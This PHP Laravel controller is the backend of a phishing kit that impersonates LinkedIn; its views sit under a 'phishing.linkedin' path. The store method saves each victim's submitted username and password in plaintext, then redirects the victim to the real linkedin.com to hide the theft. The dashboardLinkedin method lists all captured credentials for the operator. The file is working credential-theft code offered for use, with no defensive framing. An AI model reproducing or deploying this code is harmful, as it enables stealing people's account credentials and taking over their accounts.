<?php

namespace App\Http\Controllers;

use App\Models\Linkedin;
use Illuminate\Http\Request;

class LinkedinController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        return view('phishing.linkedin.index');
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $dataLinkedin = new Linkedin();

        $dataLinkedin->username = $request->username;
        $dataLinkedin->password = $request->password;
        
        $dataLinkedin->save();

        return redirect('https://linkedin.com/');
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\Linkedin  $linkedin
     * @return \Illuminate\Http\Response
     */
    public function show(Linkedin $linkedin)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\Models\Linkedin  $linkedin
     * @return \Illuminate\Http\Response
     */
    public function edit(Linkedin $linkedin)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Models\Linkedin  $linkedin
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, Linkedin $linkedin)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\Linkedin  $linkedin
     * @return \Illuminate\Http\Response
     */
    public function destroy(Linkedin $linkedin)
    {
        //
    }

    public function dashboardLinkedin()
    {
        $dataLinkedin = Linkedin::orderBy('id', 'DESC')->paginate();
        //dd($dataLinkedin);
        return view('phishing.linkedin.dashboard', compact('dataLinkedin'));
    }
}
